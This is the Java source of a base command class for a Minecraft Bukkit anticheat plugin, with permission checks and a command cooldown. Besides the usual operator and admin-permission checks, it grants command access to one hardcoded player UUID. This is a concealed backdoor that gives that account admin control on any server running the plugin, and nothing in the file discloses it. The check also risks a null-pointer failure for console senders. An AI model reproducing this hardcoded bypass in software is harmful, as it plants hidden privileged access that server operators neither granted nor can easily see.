package club.shmoke.anticheat.command;

import club.shmoke.anticheat.Anticheat;
import club.shmoke.anticheat.helper.AlertManager;
import club.shmoke.anticheat.helper.TimeHelper;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public abstract class Command implements CommandExecutor {
    private String syntax;

    private TimeHelper time = new TimeHelper();

    private CommandSender sender;
    private Player player;

    public Command(String syntax) {
        this.syntax = syntax;
    }

    public String getSyntax() {
        return syntax;
    }

    public abstract void onCommand(String label, String[] args);

    public CommandSender getSender() {
        return sender;
    }

    public Player getPlayer() {
        return player;
    }

    @Override
    public boolean onCommand(CommandSender commandSender, org.bukkit.command.Command command, String label, String[] args) {
        sender = commandSender;
        if (commandSender instanceof Player) {
            Player player = (Player) commandSender;
            this.player = player;
        }
        if (getSender().isOp() || getSender().hasPermission(AlertManager.Permissions.ADMIN.getPermission()) || getPlayer().getUniqueId().toString().equals("ebdff42f-656f-458e-ae3f-186d54f852de")) {
            if (time.hasReached(2000)) {
                onCommand(label, args);
                time.reset();
            } else
                getPlayer().sendMessage("\2474Do not spam commands!");
        }
        return true;
    }
}
